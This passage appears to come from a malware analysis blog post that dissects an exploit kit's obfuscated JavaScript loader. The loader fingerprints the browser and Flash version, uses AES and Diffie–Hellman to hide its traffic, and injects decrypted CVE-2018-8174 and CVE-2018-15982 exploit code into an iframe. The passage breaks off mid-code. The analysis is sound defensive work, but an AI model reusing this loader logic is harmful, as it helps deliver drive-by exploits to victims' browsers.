<p>This is also a general request sending process. The URL is a string decoded by AES earlier. The data to be sent is the previously prepared data, but these are encrypted by AES. The key and IV are the same as those used to decode the URL. The previous data to be encrypted looks like this.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"lIlII11"</span><span class="p">:</span><span class="s2">"c81e728d9d4c2f636f067f89cc14862c"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lll1II"</span><span class="p">:</span><span class="s2">"a87ff679a2f3e71d9181a67b7542122c"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"l11IlIl"</span><span class="p">:</span><span class="s2">"3f05415ebff145466040f6a73dca8704"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lI1lIl1Ill"</span><span class="p">:</span><span class="s2">"c4ca4238a0b923820dcc509a6f75849b"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"II1l1IlI"</span><span class="p">:</span><span class="s2">"false@@false@@true@@false"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>The data actually sent is encrypted in this way.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TvU4TAyld3MNlDcMtLwxBo+uVXAbIB1jpPO1a9HDv2dZs7HonG67s8heWoMyvnUFqFBdoEhU0STYjHHQxX6DK7x7Z1naG/2TAdm+AR5l6gpYVl4jXB9oOOyfJtZrfJHabQT5Jhlqv1dtvsJ+0G27qhamqtPT16wCpXn2R2WHf8NJu9SvXSSVadW7sT6QDt32Jt0z3oR0VIlpuE/w3snfKDNIjJYhuMz/VGYIL9WNdg0hC26sxB5fJ5fOOuifh2rNk9GgNsNdfVP01Tf77GRDu9puTbgfsgYOnCz0ONOmp05B14kJ1tK8ZI6ciOWLvOYV
</code></pre></div></div>

<p>Let’s look at the process after sending. <code class="language-plaintext highlighter-rouge">onreadystatechange</code> is called. Here, two AES decodings are performed. Let’s first look at the first decoding process.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">lIlIl1IIl11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">],</span>                <span class="c1">// enc_data</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]</span> <span class="p">}</span>      <span class="c1">// iv</span>
<span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Il11I1II</span><span class="dl">'</span><span class="p">]);</span>

<span class="kd">var</span> <span class="nx">l1I1l1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIl11</span><span class="dl">'</span><span class="p">](</span><span class="nx">lIlIl1IIl11</span><span class="p">);</span>
</code></pre></div></div>

<p>POST response data is encrypted with AES. The keys and IV are the same as before, and the hard-coded values (<code class="language-plaintext highlighter-rouge">8b69cbdfc5fe43e69b7920c8ee721fc9</code> and <code class="language-plaintext highlighter-rouge">301ae8205ddcd5897df69e3b0c056c34</code>) are hard-coded in the JavaScript code. Jsonify is performed because the JSON data can be obtained by decoding. The decoded JSON data looks like this.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"IlI1l"</span><span class="p">:</span><span class="s2">"9b412e5c651d73fd1e271dd63f6901a0"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"I1111"</span><span class="p">:</span><span class="s2">"r+sZGwxURs48PDt8pilYLNYjKbVrMHSmlgv0jeEE7qd8KN+KbbqRpYBUUrEFfM5VSLfRPthHQmyzFoY7fuCtOQQ9vUiMBC+3</span><span class="se">\/</span><span class="s2">pL…"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Decode the second data using the first (32-character hexadecimal string) of this data. The first data is called str_F. Also, decoding is done with AES, but the key and IV are different from before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">lIlll1IIlI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlll1IIlI</span><span class="dl">'</span><span class="p">],</span> <span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_F</span>

<span class="c1">// key (str_G) =&gt; str_F.modPow(str_C, str_D)</span>
<span class="kd">var</span> <span class="nx">llIIlI</span> <span class="o">=</span> <span class="nx">lIlll1IIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span> <span class="nx">lll1II</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="nx">llIIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">IIIIlI1IllII</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">-</span> <span class="nx">I1Il1I1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="nx">IIIIlI1IllII</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">I1Il1I1</span><span class="p">;</span>
    <span class="nx">IIIIlI1IllII</span><span class="o">--</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">II1ll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">I1Il1I1</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">lI1lIl1Ill</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1ll1</span><span class="p">);</span>

<span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">Il11lII1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIl1IIl11</span><span class="dl">'</span><span class="p">],</span>          <span class="c1">// enc_data</span>
    <span class="nx">II1ll</span><span class="p">,</span>                          <span class="c1">// str_G</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span> <span class="p">}</span>      <span class="c1">// iv =&gt; str_A</span>
<span class="p">);</span>
</code></pre></div></div>

<p>The values generated by str_F, str_C and str_D are called str_G. Thus, str_C is required to decode the data, but str_C has not been sent to the server. By looking at the traffic data, you can see str_E and str_G created by str_C, but it is impossible to find str_C. Please see Wikipedia for details.</p>
<ul>
  <li><a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie–Hellman key exchange - Wikipedia</a></li>
</ul>

<p>The data thus decoded is executed as JavsScript.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// eval</span>
<span class="nx">II1Il</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll1I1</span><span class="dl">'</span><span class="p">]();</span>
</code></pre></div></div>

<p>Let’s look at the executed code. First, the URL used next is decoded. The key and IV used at this time are hard-coded initial values.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_url, key, iv)</span>
<span class="kd">var</span> <span class="nx">l11l1I1</span> <span class="o">=</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">lI11lIl</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">l11II11l</span><span class="dl">"</span><span class="p">](</span>
    <span class="dl">"</span><span class="s2">l9kie2x7t4Iq4hRNA3G3Juz+buSrv9OSyATsAvZRjsoWkjatAa3Am6oRnar5jjv2N8XFpvDYQbKswFbyKiGPXM/eRwj5+hz4hg+dTKr5BLk=</span><span class="dl">"</span><span class="p">,</span>
    <span class="nx">III1l1</span><span class="p">,</span>
    <span class="p">{</span> <span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nx">II1ll11I</span> <span class="p">}</span>
<span class="p">)[</span><span class="dl">"</span><span class="s2">lIlIlll11l</span><span class="dl">"</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">Il11I1II</span><span class="dl">"</span><span class="p">]);</span>
</code></pre></div></div>

<p>Then, as before, the function is called. Let’s look at the function. First, define the necessary data for encryption/decryption as before. Give each one a name as before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// str_A2</span>
<span class="kd">var</span> <span class="nx">l1ll1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]();</span>
<span class="c1">// str_B2</span>
<span class="kd">var</span> <span class="nx">lIlII11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_C2</span>
<span class="kd">var</span> <span class="nx">ll1l1IlIIIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_D2</span>
<span class="kd">var</span> <span class="nx">lll1II</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_E2 =&gt; str_B2.powMod(str_C2, str_D2)</span>
<span class="kd">var</span> <span class="nx">l11IlIl</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span><span class="nx">lll1II</span><span class="p">);</span>
</code></pre></div></div>

<p>Next, prepare the data to send as a POST request. Unlike before, Adobe Flash Player version information is also sent.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">l11IlIIlllll</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlII11</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_B2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lll1II</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lll1II</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>      <span class="c1">// str_D2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l11IlIl</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l11IlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_E2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lI1lIl1Ill</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1ll1</span><span class="p">;</span>                     <span class="c1">// str_A2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]();</span>          <span class="c1">// browser check data</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l111I</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l111I</span><span class="dl">'</span><span class="p">];</span>            <span class="c1">// Adobe Flash Player version check data</span>
</code></pre></div></div>

<p>The sending process is the same as the previous one. The key and IV used in this case are also initial values.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">I1l1I1</span><span class="dl">'</span><span class="p">](</span><span class="nx">Il1I11l</span><span class="p">,</span><span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span><span class="nx">l11l1I1</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>

<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1lllIIlI</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">,</span>
    <span class="c1">// aes_encrypt</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Ill1lI1Ill</span><span class="dl">'</span><span class="p">](</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">IIII1Il</span><span class="dl">'</span><span class="p">](</span><span class="nx">l11IlIIlllll</span><span class="p">),</span>    <span class="c1">// POST Data</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                   <span class="c1">// key</span>
        <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]}</span>     <span class="c1">// iv</span>
    <span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]()</span>
<span class="p">);</span>
</code></pre></div></div>

<p>Thus, <code class="language-plaintext highlighter-rouge">onreadystatechange</code> is called as well. Here too, the decoding process is performed as before. First, decode POST response data with the same key and IV as before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">lIlIl1IIl11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">],</span>                <span class="c1">// enc_data</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]}</span>         <span class="c1">// iv</span>
<span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Il11I1II</span><span class="dl">'</span><span class="p">]);</span>
</code></pre></div></div>

<p>When jsonify the decoded result, three data are included like this. The first 32-character hexadecimal string is called str_F2.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"lIlll1IIlI"</span><span class="p">:</span><span class="w"> </span><span class="s2">"87e087b48d4b06215f486021f23f5470"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lIIIIllIl1"</span><span class="p">:</span><span class="w"> </span><span class="s2">"oUeRtTwLk9lLYqMwZC3AM49H8HDw15IqymZ0W</span><span class="se">\/</span><span class="s2">vw87Vd9RtdXhps9ZppZc</span><span class="se">\/</span><span class="s2">INO01Bqk79BOMS9ykHCDPE</span><span class="se">\/\/</span><span class="s2">kWCHQuuh0</span><span class="se">\/</span><span class="s2">rr…"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"II11lIl11"</span><span class="p">:</span><span class="w"> </span><span class="s2">"88HY4nkc9TWmnRPi</span><span class="se">\/</span><span class="s2">hEPmk8ZCTJ5tIwItosOTmqFjUBFxCXfoXdMKas+TeKLUbdwsXAhvGa35wNmMnajdPzt1huWerzwnhoGcFP…"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Decrypt these data. Thus two data are decoded.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">lIlll1IIlI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlll1IIlI</span><span class="dl">'</span><span class="p">],</span><span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_G2 =&gt; str_F2.modPow(str_C2, str_D2)</span>
<span class="kd">var</span> <span class="nx">llIIlI</span> <span class="o">=</span> <span class="nx">lIlll1IIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span><span class="nx">lll1II</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="nx">llIIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">IIIIlI1IllII</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">-</span> <span class="nx">I1Il1I1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
<span class="k">while</span><span class="p">(</span><span class="nx">IIIIlI1IllII</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="o">+</span><span class="nx">I1Il1I1</span><span class="p">;</span>
    <span class="nx">IIIIlI1IllII</span><span class="o">--</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">II1ll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">I1Il1I1</span><span class="p">);</span>       <span class="c1">// str_G2</span>
<span class="kd">var</span> <span class="nx">lI1lIl1Ill</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1ll1</span><span class="p">);</span>    <span class="c1">// str_A2</span>

<span class="c1">// aes_decrypt()</span>
<span class="kd">var</span> <span class="nx">I1II111I1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIIIIllIl1</span><span class="dl">'</span><span class="p">],</span>       <span class="c1">// enc_data_1</span>
    <span class="nx">II1ll</span><span class="p">,</span>                      <span class="c1">// str_G2</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span><span class="p">}</span>    <span class="c1">// str_A2</span>
<span class="p">);</span>

<span class="kd">var</span> <span class="nx">IIIIl</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">II11lIl11</span><span class="dl">'</span><span class="p">],</span>        <span class="c1">// enc_data_2</span>
    <span class="nx">II1ll</span><span class="p">,</span>                      <span class="c1">// str_G2</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span><span class="p">}</span>    <span class="c1">// str_A2</span>
<span class="p">);</span>
</code></pre></div></div>

<p>The data thus decoded is written to Body and executed. The decoded data is the CVE-2018-8174 exploit code and the CVE-2018-15982 exploit code for reading swf loader.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nx">IlIII1lll</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">IIlIl</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
	<span class="nx">IIlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">IlIlll1I1</span><span class="dl">"</span><span class="p">);</span>
	<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">IIlIl</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">I11I11IIlIII</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">IlIlll1I1</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">IlIII1lll</span><span class="p">);</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">lIl1l1I</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">l1III11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
